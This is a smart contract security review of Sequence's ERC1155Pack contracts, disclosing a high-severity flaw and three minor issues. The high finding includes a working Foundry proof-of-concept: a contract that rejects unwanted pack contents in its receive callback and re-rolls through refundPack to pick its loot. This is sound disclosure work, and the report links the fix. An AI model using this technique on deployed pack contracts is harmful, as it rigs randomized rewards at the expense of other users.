# Sequence Contracts Library Security Review

- Security researcher: [@Rotcivegaf](https://github.com/rotcivegaf)
- Date From: 02/10/2025
- Date To: 09/10/2025
- Repository: [0xsequence/contracts-library](https://github.com/0xsequence/contracts-library/)
- Commit Hash: [`8a229e34702984b948bd2ac82059388ed08cbe4b`](https://github.com/0xsequence/contracts-library/tree/8a229e34702984b948bd2ac82059388ed08cbe4b)

# Content

- [Disclaimer](#disclaimer)
- [Scope](#scope)
- [Executive Summary and Observations](#executive-summary-and-observations)
- [Risk Classification](#risk-Classification)
    - [Impact](#impact)
    - [Likelihood](#likelihood)
- [Findings](#findings)
    - [High](#high)
        - [[H-01] User can reject ERC115 tokens to `refundPack`](#h-01-user-can-reject-erc115-tokens-to-refundpack)
    - [Non-Critical](#non-critical)
        - [[NC-01] Missing event in function `setPacksContent` and `refundPack`](#nc-01-missing-event-in-function-setPacksContent-and-refundPack)
        - [[NC-02] Users can only open one pack at a time](#nc-02-users-can-only-open-one-pack-at-a-time)
        - [[NC-03] The `_commitments` mapping has inverted parameters compared to those of the `refundPack` function](#nc-03-the-_commitments-mapping-has-inverted-parameters-compared-to-those-of-the-refundpack-function)

## Disclaimer

A smart contract security review can never verify the complete absence of vulnerabilities. 

This is a time, resource and expertise bound effort where we try to ﬁnd as many vulnerabilities as possible. 

I can not guarantee 100% security after the review or even if the review will ﬁnd any problems with your smart contracts. 

Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.

## Scope

- [`./src/tokens/ERC1155/presets/pack/ERC1155Pack.sol`](https://github.com/0xsequence/contracts-library/blob/8a229e34702984b948bd2ac82059388ed08cbe4b/src/tokens/ERC1155/presets/pack/ERC1155Pack.sol)
- [`./src/tokens/ERC1155/presets/pack/ERC1155PackFactory.sol`](https://github.com/0xsequence/contracts-library/blob/8a229e34702984b948bd2ac82059388ed08cbe4b/src/tokens/ERC1155/presets/pack/ERC1155PackFactory.sol)
- [`./src/tokens/ERC1155/presets/pack/IERC1155Pack.sol`](https://github.com/0xsequence/contracts-library/blob/8a229e34702984b948bd2ac82059388ed08cbe4b/src/tokens/ERC1155/presets/pack/IERC1155Pack.sol)
- [`./src/tokens/ERC1155/presets/pack/IERC1155PackFactory.sol`](https://github.com/0xsequence/contracts-library/blob/8a229e34702984b948bd2ac82059388ed08cbe4b/src/tokens/ERC1155/presets/pack/IERC1155PackFactory.sol)

## Executive Summary and Observations

The **ERC1155Pack** application is structured around key contracts such as **ERC1155Pack**, **ERC1155PackFactory**, and their associated interfaces. These contracts manage the creation, distribution, and minting of token packs. The analysis focused on the interactions between these components, particularly examining how packs are initialized, revealed, and refunded.

**ERC1155Pack** is a crucial contract that inherits functionalities from **ERC1155Items** and implements interfaces like **IERC1155Pack**. It leverages external libraries such as **MerkleProofLib** to ensure the integrity and security of merkle proofs used in token distribution.

The **ERC1155PackFactory** contract is responsible for deploying new packs. It inherits from the **SequenceProxyFactory**, utilizing functions like `_createProxy` and `determineAddress` to manage deployment and proxy creation.

## Risk Classification

| Likelihood \ Impact | High     | Medium | Low    |
|---------------------|----------|--------|--------|
| High                | Critical | High   | Medium |
| Medium              | High     | Medium | Low    |
| Low                 | Medium   | Low    | Low    |

### Impact

- High: Leads to a significant material loss of assets in the protocol or significantly
harms a group of users.
- Medium: Only a small amount of funds can be lost (such as leakage of value) or a
core functionality of the protocol is affected.
- Low: Can lead to any kind of unexpected behavior with some of the protocol's
functionalities that's not so critical.

### Likelihood

- High: Attack path is possible with reasonable assumptions that mimic on-chain
conditions, and the cost of the attack is relatively low compared to the amount of
funds that can be stolen or lost.
- Medium: Only a conditionally incentivized attack vector, but still relatively
likely.
- Low: Has too many or too unlikely assumptions or requires a significant stake by
the attacker with little or no incentive.

## Findings

| Severity     | Amount |
|--------------|--------|
| High         |   1    |
| Medium       |   0    |
| Low          |   0    |
| Non-Critical |   3    |

## High

### [H-01] User can reject ERC115 tokens to `refundPack` 

- Impact: Medium
- Likelihood: High

#### Code Snippets

- [./src/tokens/ERC1155/presets/pack/ERC1155Pack.sol#L95-L96](https://github.com/0xsequence/contracts-library/blob/8a229e34702984b948bd2ac82059388ed08cbe4b/src/tokens/ERC1155/presets/pack/ERC1155Pack.sol#L95-L96)

#### Description

In the **ERC1155Pack** contract, after performing a `commit`, the `reveal` is performed using the blockhash + user address to obtain a pseudorandom (explained and warning in [randomization-mechanism](https://github.com/0xsequence/contracts-library/blob/master/src/tokens/ERC1155/README.md#randomization-mechanism)).

The problem is that after 256 blocks, the blockhash is deleted. This problem is solved by using the `refundPack` function and returning the pack to the user. Since this function can be called by anyone, this case should be very unlikely.

However, the pack user could reject the IERC1155 if it is not the expected pack, since the `batchMint` function performs a callback (`onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)`), then wait 256 for the blockhash of the commit to be 0 and call `refundPack` to get their pack back and thus perform the `commit` again.

#### PoC

```solidity
pragma solidity ^0.8.19;

import { TestHelper } from "../../../TestHelper.sol";
import "forge-std/Test.sol";

import { ERC1155Items } from "src/tokens/ERC1155/presets/items/ERC1155Items.sol";
import { IERC1155ItemsSignals } from "src/tokens/ERC1155/presets/items/IERC1155Items.sol";

import { ERC1155Pack } from "src/tokens/ERC1155/presets/pack/ERC1155Pack.sol";
import { ERC1155PackFactory } from "src/tokens/ERC1155/presets/pack/ERC1155PackFactory.sol";
import { IERC1155Pack } from "src/tokens/ERC1155/presets/pack/IERC1155Pack.sol";
import { ERC721Items } from "src/tokens/ERC721/presets/items/ERC721Items.sol";

import { IERC1155 } from "openzeppelin-contracts/contracts/token/ERC1155/IERC1155.sol";
import { IERC721 } from "openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";

contract POC is TestHelper, IERC1155ItemsSignals {

    ERC1155Pack private pack;
    ERC1155Items private token;
    ERC1155Items private token2;
    ERC721Items private token721;

    address private proxyOwner;
    address private owner;

    IERC1155Pack.PackContent[] private packsContent;

    function setUp() public {
        owner = makeAddr("owner");
        proxyOwner = makeAddr("proxyOwner");

        token = new ERC1155Items();
        token.initialize(address(this), "test", "ipfs://", "ipfs://", address(this), 0, address(0), bytes32(0));

        token2 = new ERC1155Items();
        token2.initialize(address(this), "test2", "ipfs://", "ipfs://", address(this), 0, address(0), bytes32(0));

        token721 = new ERC721Items();
        token721.initialize(
            address(this), "test721", "test721", "ipfs://", "ipfs://", address(this), 0, address(0), bytes32(0)
        );

        ERC1155PackFactory factory = new ERC1155PackFactory(address(this));

        _preparePacksContent();
        (bytes32 root,) = TestHelper.getMerklePartsPacks(packsContent, 0);

        pack = ERC1155Pack(
            factory.deploy(
                proxyOwner, owner, "name", "baseURI", "contractURI", address(this), 0, address(0), bytes32(0)
            )
        );

        vm.prank(owner);
        pack.setPacksContent(root, 4, 0);

        token.grantRole(keccak256("MINTER_ROLE"), address(pack));
        token2.grantRole(keccak256("MINTER_ROLE"), address(pack));
        token721.grantRole(keccak256("MINTER_ROLE"), address(pack));
    }

    function _preparePacksContent() internal {
        packsContent = new IERC1155Pack.PackContent[](4);

        // Multiple tokens on single address
        packsContent[0].tokenAddresses = new address[](1);
        packsContent[0].tokenAddresses[0] = address(token);
        packsContent[0].isERC721 = new bool[](1);
        packsContent[0].isERC721[0] = false;
        packsContent[0].tokenIds = new uint256[][](1);
        packsContent[0].tokenIds[0] = new uint256[](2);
        packsContent[0].tokenIds[0][0] = 1;
        packsContent[0].tokenIds[0][1] = 2;
        packsContent[0].amounts = new uint256[][](1);
        packsContent[0].amounts[0] = new uint256[](2);
        packsContent[0].amounts[0][0] = 10;
        packsContent[0].amounts[0][1] = 5;

        // Single token on single address
        packsContent[1].tokenAddresses = new address[](1);
        packsContent[1].tokenAddresses[0] = address(token);
        packsContent[1].isERC721 = new bool[](1);
        packsContent[1].isERC721[0] = false;
        packsContent[1].tokenIds = new uint256[][](1);
        packsContent[1].tokenIds[0] = new uint256[](1);
        packsContent[1].tokenIds[0][0] = 3;
        packsContent[1].amounts = new uint256[][](1);
        packsContent[1].amounts[0] = new uint256[](1);
        packsContent[1].amounts[0][0] = 15;

        // Single token on multiple addresses
        packsContent[2].tokenAddresses = new address[](2);
        packsContent[2].tokenAddresses[0] = address(token);
        packsContent[2].tokenAddresses[1] = address(token2);
        packsContent[2].isERC721 = new bool[](2);
        packsContent[2].isERC721[0] = false;
        packsContent[2].isERC721[1] = false;
        packsContent[2].tokenIds = new uint256[][](2);
        packsContent[2].tokenIds[0] = new uint256[](1);
        packsContent[2].tokenIds[0][0] = 4;
        packsContent[2].tokenIds[1] = new uint256[](1);
        packsContent[2].tokenIds[1][0] = 5;
        packsContent[2].amounts = new uint256[][](2);
        packsContent[2].amounts[0] = new uint256[](1);
        packsContent[2].amounts[0][0] = 20;
        packsContent[2].amounts[1] = new uint256[](1);
        packsContent[2].amounts[1][0] = 10;

        // single token on single address ERC721
        packsContent[3].tokenAddresses = new address[](1);
        packsContent[3].tokenAddresses[0] = address(token721);
        packsContent[3].isERC721 = new bool[](1);
        packsContent[3].isERC721[0] = true;
        packsContent[3].tokenIds = new uint256[][](1);
        packsContent[3].tokenIds[0] = new uint256[](2);
        packsContent[3].tokenIds[0][0] = 1;
        packsContent[3].tokenIds[0][1] = 2;
        packsContent[3].amounts = new uint256[][](1);
        packsContent[3].amounts[0] = new uint256[](2);
        packsContent[3].amounts[0][0] = 1;
        packsContent[3].amounts[0][1] = 1;
    }

    function testPoC() public {
        Vm.Wallet memory userWithCode = vm.createWallet(uint256(keccak256(bytes("userWithCode"))));
        address user = userWithCode.addr;
        uint256 wantedIdx = 2;

        uint256 revealIdx = _getRevealIdx(user);

        LootSelector r = new LootSelector();
        vm.signAndAttachDelegation(address(r), userWithCode.privateKey);
        LootSelector(user).setValues(pack, 0, wantedIdx);

        bytes32[] memory proof;
        IERC1155Pack.PackContent memory packContent;
        while (true) {
            uint256 commitment = get_commitments(user, 0);
            LootSelector(user).setCommitment(commitment);

            (, proof) = TestHelper.getMerklePartsPacks(packsContent, revealIdx);
            packContent = packsContent[revealIdx];

            console2.log("i");
            try pack.reveal(user, packContent, proof, 0) {
                break;
            } catch (bytes memory) {
                vm.roll(commitment + 256 + 1);
                pack.refundPack(user, 0);

                vm.prank(user);
                pack.commit(0);

                vm.roll(block.number + 3);
                revealIdx = pack.getRevealIdx(user, 0);
            }
        }

        for (uint256 i = 0; i < packContent.tokenAddresses.length; i++) {
            for (uint256 j = 0; j < packContent.tokenIds[i].length; j++) {
                if (packContent.isERC721[i]) {
                    vm.assertEq(IERC721(packContent.tokenAddresses[i]).ownerOf(packContent.tokenIds[i][j]), user);
                } else {
                    vm.assertEq(
                        IERC1155(packContent.tokenAddresses[i]).balanceOf(user, packContent.tokenIds[i][j]),
                        packContent.amounts[i][j]
                    );
                }
            }
        }
    }

    function get_commitments(address user, uint256 packId) internal view returns (uint256) {
        uint256 baseSlot = 15;
        bytes32 innerSlot = keccak256(abi.encode(packId, bytes32(baseSlot)));
        bytes32 valueSlot = keccak256(abi.encode(user, innerSlot));
        return uint256(vm.load(address(pack), valueSlot));
    }

    function _commit(
        address user
    ) internal {
        vm.prank(owner);
        pack.mint(user, 0, 1, "pack");

        vm.prank(user);
        pack.commit(0);
    }

    function _getRevealIdx(
        address user
    ) internal returns (uint256 revealIdx) {
        _commit(user);
        vm.roll(block.number + 3);
        revealIdx = pack.getRevealIdx(user, 0);
    }

}

contract LootSelector {

    ERC1155Pack pack;
    uint256 packId;
    uint256 wantedIdx;
    uint256 commitment;

    function setValues(ERC1155Pack _pack, uint256 _packId, uint256 _wantedIdx) external {
        pack = _pack;
        packId = _packId;
        wantedIdx = _wantedIdx;
    }

    function setCommitment(
        uint256 _commitment
    ) external {
        commitment = _commitment;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external view returns (bytes4 s) {
        uint256 remainingSupply = pack.remainingSupply(packId);
        bytes32 blockHash = blockhash(commitment);
        uint256 randomIdx = uint256(keccak256(abi.encode(blockHash, address(this)))) % remainingSupply;

        if (randomIdx == wantedIdx) {
            return this.onERC1155BatchReceived.selector;
        }

        console2.log("Rejected:", randomIdx, "Want:", wantedIdx);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4 s) {
        return this.onERC1155Received.selector;
    }

}
```

#### Fix

[Add ERC1155Holder to prevent Packs.reveal abuse #40](https://github.com/0xsequence/contracts-library/pull/40/commits/2946cb20f531cea15c8a01926f46ea728a7a3f9a)

## Non-Critical

### [NC-01] Missing event in function `setPacksContent` and `refundPack`

- [`setPacksContent`](https://github.com/0xsequence/contracts-library/blob/8a229e34702984b948bd2ac82059388ed08cbe4b/src/tokens/ERC1155/presets/pack/ERC1155Pack.sol#L48-L53)
- [`refundPack`](https://github.com/0xsequence/contracts-library/blob/8a229e34702984b948bd2ac82059388ed08cbe4b/src/tokens/ERC1155/presets/pack/ERC1155Pack.sol#L104-L115)

Both functions lack an event, which helps offchain applications monitor contracts.

### [NC-02] Users can only open one pack at a time

Each user can only have one commit at a time, which makes it impossible to open more than one pack at the same time. However, this adds extra complexity to the contract.

### [NC-03] The `_commitments` mapping has inverted parameters compared to those of the `refundPack` function

The `refundPack` function has the parameters `address user, uint256 packId` and the mapping `_commitments`, however, `uint256 packId, address user`.

The most intuitive approach is to follow the pattern of the parameters of the `refundPack` function and reverse those of `_commitments`.